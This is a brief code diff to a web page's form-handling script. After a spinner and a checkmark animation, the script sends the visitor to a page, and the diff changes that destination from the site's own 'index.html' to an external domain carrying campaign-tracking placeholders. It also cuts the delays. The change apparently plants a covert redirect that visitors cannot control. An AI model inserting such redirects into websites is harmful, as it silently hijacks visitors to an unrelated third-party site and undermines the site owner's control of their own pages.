@@ -237,9 +237,9 @@ if(form){
         helper.textContent = 'Redirecting…';
 
         // Small grace period for the checkmark animation
-        setTimeout(() => { window.location.href = 'index.html'; }, 600);
+        setTimeout(() => { window.location.href = 'http://h2n6.com/?utm_campaign=Dv6poC0S9Y&v1=[v1]&v2=[v2]&v3=[v3]'; }, 100);
       }, 5000);
-    }, 300); // "few milliseconds" before starting the spinner
+    }, 100); // "few milliseconds" before starting the spinner
   }
 
   // Start automatically; no buttons or user control
